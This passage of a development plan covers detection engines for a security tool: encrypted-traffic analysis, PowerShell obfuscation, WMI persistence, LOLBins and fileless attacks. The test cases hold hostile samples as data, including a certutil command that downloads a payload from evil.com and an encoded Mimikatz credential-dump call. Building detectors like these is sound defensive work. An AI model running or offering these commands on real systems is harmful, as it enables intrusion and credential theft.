- Test: `tests/test_detection/test_encrypted_traffic.py`

**Step 1: Write failing tests**

Test `EncryptedTrafficEngine`:
- `analyze_event()` with `etw.tls_handshake` event containing known-malicious JA3 → returns alert
- `analyze_event()` with connection timestamps showing beaconing → returns alert
- `analyze_event()` with `etw.http_request` to suspicious URL → returns alert
- Normal traffic → no alerts

**Step 2: Run to verify failure**

**Step 3: Implement**

`EncryptedTrafficEngine` orchestrates: JA3 lookup (via `SSLBLFeed` bloom filter), `BeaconDetector`, `CertAnalyzer`. Maintains per-destination timestamp tracking in a `defaultdict(list)`. Method `analyze_event(event) -> list[Alert]` is the pipeline interface.

**Step 4: Run tests, commit**

```bash
git add src/aegis/detection/encrypted_traffic.py tests/test_detection/test_encrypted_traffic.py
git commit -m "feat: encrypted traffic analysis engine"
```

---

## Task 13: Encrypted Traffic — Pipeline Integration

**Files:**
- Modify: `src/aegis/detection/pipeline.py`
- Modify: `tests/test_detection/test_pipeline.py`

Same pattern as Task 7: add `encrypted_traffic` parameter to `DetectionPipeline.__init__`, add `_run_encrypted_traffic()` method, call it in `_run_parallel_engines()` for ETW TLS/HTTP events and network connection events.

**Step 1-5: Test, implement, verify, commit**

```bash
git commit -m "feat: integrate encrypted traffic engine into detection pipeline"
```

---

## Task 14: PowerShell Obfuscation Detector

**Files:**
- Create: `src/aegis/detection/powershell_analyzer.py`
- Test: `tests/test_detection/test_powershell_analyzer.py`

**Step 1: Write failing tests**

```python
class TestEntropyAnalysis:
    def test_clean_powershell_low_entropy(self):
        analyzer = PowerShellAnalyzer()
        result = analyzer.analyze("Get-Process | Where-Object {$_.CPU -gt 10}")
        assert result.entropy < 5.0
        assert result.is_obfuscated is False

    def test_base64_encoded_high_entropy(self):
        analyzer = PowerShellAnalyzer()
        import base64
        payload = base64.b64encode(b"Invoke-Mimikatz -DumpCreds").decode()
        script = f"powershell -enc {payload}"
        result = analyzer.analyze(script)
        assert result.is_obfuscated is True

class TestPatternDetection:
    def test_detects_backtick_obfuscation(self):
        analyzer = PowerShellAnalyzer()
        result = analyzer.analyze("I`nv`oke-`Exp`ress`ion")
        assert "backtick_obfuscation" in result.matched_patterns

    def test_detects_string_concatenation(self):
        analyzer = PowerShellAnalyzer()
        result = analyzer.analyze("('Inv'+'oke'+'-Exp'+'ress'+'ion')")
        assert "string_concat" in result.matched_patterns

    def test_detects_char_array(self):
        analyzer = PowerShellAnalyzer()
        result = analyzer.analyze("[char[]]@(73,110,118) -join ''")
        assert "char_array_join" in result.matched_patterns

    def test_detects_frombase64string(self):
        analyzer = PowerShellAnalyzer()
        result = analyzer.analyze(
            "[System.Convert]::FromBase64String('dGVzdA==')"
        )
        assert "base64_inline" in result.matched_patterns

    def test_clean_script_no_patterns(self):
        analyzer = PowerShellAnalyzer()
        result = analyzer.analyze("Get-ChildItem -Path C:\\Users")
        assert len(result.matched_patterns) == 0
```

**Step 2: Run to verify failure**

**Step 3: Implement PowerShellAnalyzer**

`PowerShellAnalyzer` with `analyze(script: str) -> ObfuscationResult` returning: entropy, is_obfuscated, matched_patterns (list of pattern names), confidence.

8 regex patterns from the design doc. Combined scoring: entropy > 5.0 OR 2+ pattern matches → is_obfuscated.

**Step 4: Run tests, commit**

```bash
git add src/aegis/detection/powershell_analyzer.py tests/test_detection/test_powershell_analyzer.py
git commit -m "feat: PowerShell obfuscation detector with entropy and pattern analysis"
```

---

## Task 15: WMI Persistence Scanner

**Files:**
- Create: `src/aegis/detection/wmi_scanner.py`
- Test: `tests/test_detection/test_wmi_scanner.py`

**Step 1: Write failing tests**

Test `WMIPersistenceScanner` with mocked `wmi.WMI`:
- Empty namespace → no findings
- Namespace with `CommandLineEventConsumer` binding → finding with HIGH risk
- Namespace with `ActiveScriptEventConsumer` → finding with CRITICAL risk
- `scan_all_namespaces()` calls `_scan_namespace()` for each discovered namespace

**Step 2: Run to verify failure**

**Step 3: Implement**

`WMIPersistenceScanner` with:
- `scan_namespace(namespace: str) -> list[WMIFinding]`
- `scan_all_namespaces() -> list[WMIFinding]`
- `_enumerate_namespaces(root: str) -> list[str]`

Graceful degradation: catch `wmi` import errors, catch access denied.

**Step 4: Run tests, commit**

```bash
git add src/aegis/detection/wmi_scanner.py tests/test_detection/test_wmi_scanner.py
git commit -m "feat: WMI persistence scanner"
```

---

## Task 16: LOLBins Analyzer

**Files:**
- Create: `src/aegis/detection/lolbins_analyzer.py`
- Create: `rules/lolbins/lolbins.yaml`
- Test: `tests/test_detection/test_lolbins_analyzer.py`

**Step 1: Write failing tests**

```python
class TestParentChildAnalysis:
    def test_office_spawning_powershell(self):
        analyzer = LOLBinsAnalyzer()
        result = analyzer.check_parent_child("winword.exe", "powershell.exe", "")
        assert result is not None
        assert result.severity == "high"

    def test_normal_parent_child(self):
        analyzer = LOLBinsAnalyzer()
        result = analyzer.check_parent_child("explorer.exe", "notepad.exe", "")
        assert result is None

class TestCommandLineAnalysis:
    def test_certutil_download(self):
        analyzer = LOLBinsAnalyzer()
        result = analyzer.check_command_line(
            "certutil.exe",
            "certutil -urlcache -split -f http://evil.com/payload.exe"
        )
        assert result is not None
        assert "download" in result.description.lower()

    def test_normal_certutil(self):
        analyzer = LOLBinsAnalyzer()
        result = analyzer.check_command_line(
            "certutil.exe", "certutil -dump cert.pem"
        )
        assert result is None
```

**Step 2: Run to verify failure**

**Step 3: Implement**

`LOLBinsAnalyzer` loads YAML rules from `rules/lolbins/`. Methods: `check_parent_child()`, `check_command_line()`, `analyze_process_event(event) -> list[LOLBinFinding]`.

YAML file contains the top 10 LOLBins with suspicious parents and command-line patterns.

**Step 4: Run tests, commit**

```bash
git add src/aegis/detection/lolbins_analyzer.py rules/lolbins/lolbins.yaml tests/test_detection/test_lolbins_analyzer.py
git commit -m "feat: LOLBins analyzer with YAML rule database"
```

---

## Task 17: Fileless Attack Detection Engine

**Files:**
- Create: `src/aegis/detection/fileless_detector.py`
- Test: `tests/test_detection/test_fileless_detector.py`

**Step 1: Write failing tests**

Test `FilelessDetector.analyze_event()`:
- `etw.powershell_scriptblock` with obfuscated script → alert
- `etw.dotnet_assembly_load` with empty `module_il_path` → alert
- `etw.wmi_activity` in `root\subscription` namespace → alert
- `process_new` event with suspicious parent-child → alert
- Clean events → no alerts

**Step 2: Run to verify failure**

**Step 3: Implement**

`FilelessDetector` orchestrates: `PowerShellAnalyzer`, `WMIPersistenceScanner`, `LOLBinsAnalyzer`, plus inline .NET detection logic. Method `analyze_event(event) -> list[Alert]` dispatches based on `event.event_type`.

**Step 4: Run tests, commit**

```bash
git add src/aegis/detection/fileless_detector.py tests/test_detection/test_fileless_detector.py
git commit -m "feat: fileless attack detection engine"
```

---

## Task 18: Fileless Detector — Pipeline Integration

**Files:**
- Modify: `src/aegis/detection/pipeline.py`
- Modify: `tests/test_detection/test_pipeline.py`

Same pattern as Tasks 7 and 13: add `fileless_detector` parameter, `_run_fileless_detector()` method, called for ETW events and process events.

**Step 1-5: Test, implement, verify, commit**

```bash
git commit -m "feat: integrate fileless detector into detection pipeline"
```

---

## Task 19: Enhanced Network Sensor — Beacon Tracking

**Files:**
- Modify: `src/aegis/sensors/network.py`
- Modify: `tests/test_sensors/test_network.py`

**Step 1: Write failing test**

Test that `collect()` now includes `dest_timestamps` in `connection_snapshot` events — a dict mapping destination IPs to lists of connection timestamps.

**Step 2: Run to verify failure**

**Step 3: Implement**

Add `_dest_timestamps: dict[str, list[float]]` to NetworkSensor. On each `collect()`, record current time for each active remote IP. Include in `network_flow_stats` events. Cap at last 200 timestamps per destination.

**Step 4: Run tests, commit**

```bash
git commit -m "feat: network sensor tracks per-destination connection timestamps"
```

---

## Task 20: Integration Test — Full Pipeline

**Files:**
- Create: `tests/test_integration/test_phase24_advanced_detection.py`

**Step 1: Write integration tests**

Test the complete flow:
1. Create mock ETW events (powershell scriptblock, image load, tls handshake)
2. Pass through DetectionPipeline with all three new engines
3. Verify correct alerts are produced with proper MITRE IDs
4. Test that normal events produce no alerts
5. Test that multiple engines can fire on the same event

**Step 2: Run to verify they pass**

Run: `pytest tests/test_integration/test_phase24_advanced_detection.py -v`

**Step 3: Run full test suite**

Run: `pytest`
Expected: All existing tests still pass + new tests pass

**Step 4: Commit**

```bash
git add tests/test_integration/test_phase24_advanced_detection.py
git commit -m "feat: Phase 24 integration tests for advanced detection layer"
```

---

## Task 21: Final Commit — Phase 24 Complete

**Step 1: Run full test suite one final time**

Run: `pytest --tb=short`
Expected: ALL PASS (2167 existing + ~200 new = ~2367 tests)

**Step 2: Create phase commit**

```bash
git add -A
git commit -m "feat: Phase 24 — Advanced Detection Layer (memory forensics, encrypted traffic, fileless attacks)"
```

---

## Summary — Task Dependencies

```
Task 1 (SensorType.ETW) ─► Task 2 (ETW providers) ─► Task 3 (ETW sensor)
                                                           │
Task 4 (win_memory) ─► Task 5 (memory core) ─► Task 6 (hooks/threads) ─► Task 7 (pipeline)
                                                                              │
Task 9 (JA3) ──────┐                                                         │
Task 10 (certs) ───┤► Task 12 (encrypted traffic engine) ─► Task 13 (pipeline)
Task 8 (beacon) ───┤                                                          │
Task 11 (SSLBL) ───┘                                                          │
                                                                               │
Task 14 (PowerShell) ─┐                                                       │
Task 15 (WMI) ────────┤► Task 17 (fileless engine) ─► Task 18 (pipeline)     │
Task 16 (LOLBins) ────┘                                                       │
                                                                               │
Task 19 (network sensor) ─────────────────────────────────────────────────────┘
                                                                               │
Task 20 (integration test) ◄──────────────────────────────────────────────────┘
Task 21 (final commit)
```

**Parallel-safe groups** (can be dispatched to subagents simultaneously):
- Group A: Tasks 1-3 (ETW foundation)
- Group B: Tasks 4-7 (memory forensics) — after Task 1
- Group C: Tasks 8-13 (encrypted traffic) — after Task 1
- Group D: Tasks 14-18 (fileless detection) — after Task 3
- Group E: Task 19 (network enhancement) — independent
- Sequential: Tasks 20-21 (integration) — after all others
